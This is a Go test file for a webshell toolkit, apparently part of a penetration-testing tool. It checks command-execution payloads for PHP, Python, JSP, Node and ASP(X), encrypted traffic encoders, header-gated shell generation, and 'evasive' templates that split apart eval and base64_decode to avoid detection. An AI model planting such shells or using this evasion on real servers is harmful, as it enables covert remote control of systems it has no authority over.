package webshell

// compat_test.go — 与原 Python 实现（AI-PENTEST backend/app/webshell）的线上协议
// 兼容性回归。加密字节逐字节等于 Python 侧真实运行输出（encoders 必须可互操作）；
// payload 只断言语义要素（b64 参数、__WS_*__ 标记）——payload 是服务端 eval 的
// 代码，行为一致即可，不要求逐字节。

import (
	"bytes"
	"encoding/hex"
	"strings"
	"testing"
)

const (
	compatPW    = "test123"
	compatPlain = "echo 'compat-check';"
)

func TestAESEncryptCompat(t *testing.T) {
	// python -c "from webshell.encoders import AesEncoder; print(AesEncoder().encrypt(b\"echo 'compat-check';\", 'test123').hex())"
	want, _ := hex.DecodeString("765968304156526a304c657666716c67386253644f786e6556506f7276707a372b587a324c6f44496356343d")
	got, err := AesEncoder{}.Encrypt([]byte(compatPlain), compatPW)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, want) {
		t.Fatalf("aes mismatch:\n got %x\nwant %x", got, want)
	}
}

func TestXorEncryptCompat(t *testing.T) {
	// python: XorEncoder().encrypt(b"echo 'compat-check';", "test123").hex()
	want, _ := hex.DecodeString("5856594f44525954566c786253416441464674515856746551566b3d")
	got, err := XorEncoder{}.Encrypt([]byte(compatPlain), compatPW)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, want) {
		t.Fatalf("xor mismatch:\n got %x\nwant %x", got, want)
	}
}

func TestRawAndFormCmd(t *testing.T) {
	got, err := RawEncoder{}.Encrypt([]byte("abc"), "")
	if err != nil || string(got) != "YWJj" {
		t.Fatalf("raw: %q %v", got, err)
	}
	fc, err := FormCmdEncoder{}.Encrypt([]byte("<?php\necho 1;\n?>"), "")
	if err != nil {
		t.Fatal(err)
	}
	if string(fc) != "cmd=echo+1%3B" {
		t.Fatalf("form-cmd: %q", fc)
	}
	if f := resolveField("field:user"); f != "user" {
		t.Fatalf("field resolve: %q", f)
	}
}

func TestPayloadMarkers(t *testing.T) {
	// b64("whoami")=d2hvYW1p  b64("/tmp")=L3RtcA==
	checks := []struct {
		name, code string
	}{
		{"php-exec", phpExec("whoami", "/tmp")},
		{"php-list", phpList("/var/www")},
		{"py-exec", pyExec("id", "")},
		{"jsp-exec", jspExec("uname -a", "/root")},
		{"node-exec", nodeExec("dir", "C:/")},
		{"asp-exec", aspExec("ipconfig")},
		{"aspx-exec", aspxExec("whoami", "C:/inetpub")},
	}
	for _, c := range checks {
		// aspx 为 cmd-only 特例：shell 直接回显命令输出，无 END 标记（与原实现一致）
		if c.name == "aspx-exec" {
			continue
		}
		if !strings.Contains(c.code, "\"____WS_END__\"") && !strings.Contains(c.code, EndMarker) {
			t.Errorf("%s: missing END marker", c.name)
		}
	}
	for _, kw := range []string{"d2hvYW1p", "L3RtcA==", CWDMarker} {
		if !strings.Contains(phpExec("whoami", "/tmp"), kw) {
			t.Errorf("php-exec missing %s", kw)
		}
	}
	if !strings.Contains(phpExec("whoami", "/tmp"), "shell_exec($cmd . \" 2>&1\")") {
		t.Error("php-exec stderr merge missing")
	}
	if !strings.Contains(pyExec("id", ""), "subprocess.run(cmd, shell=True") {
		t.Error("py-exec shell mode missing")
	}
	if !strings.Contains(jspExec("uname", ""), "ProcessBuilder") {
		t.Error("jsp-exec ProcessBuilder missing")
	}
	if !strings.Contains(nodeExec("dir", "C:/"), "execSync") {
		t.Error("node-exec execSync missing")
	}
	if aspxExec("whoami", "C:/inetpub") != "cd /d \"C:/inetpub\" && whoami" {
		t.Errorf("aspx-exec cwd prefix: %q", aspxExec("whoami", "C:/inetpub"))
	}
}

func TestParseExecResponse(t *testing.T) {
	res := Parse([]byte("www-data\n__WS_CWD__/var/www__"+EndMarker), "exec")
	if !res.OK || res.Output != "www-data" || res.CWD != "/var/www" {
		t.Fatalf("parse exec: %+v", res)
	}
	res = Parse([]byte("__WS_PONG__abcd12__"+EndMarker), "test")
	if !res.OK || res.Output != "abcd12" {
		t.Fatalf("parse test: %+v", res)
	}
	res = Parse([]byte("ERROR: cannot read"+EndMarker), "read")
	if res.OK || res.Error == "" {
		t.Fatalf("parse read err: %+v", res)
	}
	// GBK 回退：非法 UTF-8（"中文" 的 GBK 字节 d6 d0 ce c4）
	res = Parse([]byte("\xd6\xd0\xce\xc4\n__WS_CWD__/__"+EndMarker), "exec")
	if !res.OK || res.Output == "" {
		t.Fatalf("parse gbk: %+v", res)
	}
}

func TestGenerateShellMarks(t *testing.T) {
	code, err := GenerateShell("php", "aes", "p@ss")
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains([]byte(code), []byte(passwordMark)) {
		t.Fatal("password placeholder leaked")
	}
	if !bytes.Contains([]byte(code), []byte("substr(md5('p@ss'), 0, 16)")) {
		t.Fatalf("php aes key derivation wrong:\n%s", code)
	}
	if _, err := GenerateShell("aspx", "aes", "x"); err == nil {
		t.Fatal("aspx+aes should be unsupported")
	}
	if c, _ := GenerateShell("jspx", "raw", "x"); !strings.HasPrefix(c, "<?xml") {
		t.Fatal("jspx wrap missing")
	}
}

func TestEvasiveTemplates(t *testing.T) {
	// 功能等价：协议 key 派生不变（aes/xor 与基础版行为一致由靶场回归保证；
	// 这里静态断言免杀产物的特征形态）。
	for _, enc := range []string{"raw", "aes", "xor"} {
		code, err := GenerateShellEvasive("php", enc, "pw123", GateOpts{}, EvasiveOpts{Enabled: true})
		if err != nil {
			t.Fatal(enc, err)
		}
		// 明文特征不应整体出现（拼接拆散）
		for _, sig := range []string{"eval(", "base64_decode(", "openssl_decrypt(", "file_get_contents('php://input')"} {
			if strings.Contains(code, sig) {
				t.Errorf("%s evasive 泄露明文特征 %q", enc, sig)
			}
		}
		// 功能要素仍在：include 临时文件执行链（eval 是语言构造器不可字符串调用）
		if !strings.Contains(code, "include(") || !strings.Contains(code, "'<?p'.'hp '") {
			t.Errorf("%s evasive 缺 include 执行链", enc)
		}
	}
	// gate 内联进同一 php 块
	code, _ := GenerateShellEvasive("php", "aes", "p", GateOpts{Header: "X-G", Value: "1"}, EvasiveOpts{Enabled: true})
	if !strings.Contains(code, "HTTP_X_G") || !strings.Contains(code, "include(") {
		t.Fatal("evasive+gate 合并失败")
	}
	// 未开启时走原版
	base, _ := GenerateShellEvasive("php", "raw", "p", GateOpts{}, EvasiveOpts{})
	if !strings.Contains(base, "eval($p);") && !strings.Contains(base, "eval(") {
		t.Fatal("未开启 evasive 应为原版模板")
	}
}
